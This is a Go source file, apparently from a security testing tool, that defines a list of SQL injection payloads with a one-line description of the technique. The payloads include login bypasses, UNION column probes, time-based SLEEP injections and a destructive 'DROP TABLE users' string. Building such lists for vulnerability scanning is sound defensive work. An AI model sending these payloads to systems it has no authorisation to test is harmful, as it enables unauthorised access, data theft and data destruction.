package techniques

// SQLi payloads for SQL injection testing.
var SQLiPayloads = []string{
	"' OR '1'='1",
	"' OR '1'='1' --",
	"' OR '1'='1' /*",
	"1' ORDER BY 1--",
	"1' UNION SELECT NULL--",
	"1' UNION SELECT NULL,NULL--",
	"'; DROP TABLE users--",
	"' AND 1=1--",
	"' AND 1=2--",
	"1 OR 1=1",
	"' OR 'x'='x",
	"' AND SLEEP(5)--",
	"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
	"' OR 1=1 LIMIT 1--",
	"admin' --",
}

// SQLiDescription describes the SQL injection technique.
const SQLiDescription = "SQL Injection - Tests for SQL injection vulnerabilities by injecting SQL syntax into parameters"
